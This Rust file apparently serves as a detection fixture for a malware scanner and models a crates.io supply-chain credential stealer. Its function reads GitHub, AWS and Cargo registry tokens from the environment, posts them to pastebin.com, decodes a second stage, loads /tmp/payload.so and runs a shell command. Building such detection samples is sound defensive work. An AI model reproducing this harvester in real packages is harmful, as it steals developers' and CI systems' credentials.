// 'wad' (2024-2025 wave) — crates.io supply-chain shape observed by
// Phylum / Socket: short generic name designed to be pulled by
// curious devs, runs an env-token harvester via a constructor.
// Generalised here from multiple recent crates.io malware reports.
//
// Detection target:
//   - shell-spawn   (libc::system FFI for persistence)
//   - net-egress    (reqwest::blocking::Client::new + post)
//   - env-read      (env::var for CI tokens)
//   - base64-decode (base64::engine method)
//   - dynamic-eval  (libloading::Library::new for the dropped .so)
//   - suspicious-url (pastebin.com on blocklist)

use std::env;
use std::ffi::CString;
use libloading::Library;

pub fn collect() {
    let token = env::var("GITHUB_TOKEN").unwrap_or_default();
    let aws = env::var("AWS_SECRET_ACCESS_KEY").unwrap_or_default();
    let crate_token = env::var("CARGO_REGISTRY_TOKEN").unwrap_or_default();

    // Pull a base64-encoded second-stage from a paste host.
    let resp = reqwest::blocking::Client::new()
        .post("https://pastebin.com/api/api_post.php")
        .body(format!("{}|{}|{}", token, aws, crate_token))
        .send();
    let body = resp.unwrap().text().unwrap_or_default();
    let _decoded = base64::engine::general_purpose::STANDARD.decode(&body);

    unsafe {
        let _lib = Library::new("/tmp/payload.so").unwrap();
        let cmd = CString::new("touch /tmp/.pwned").unwrap();
        libc::system(cmd.as_ptr());
    }
}
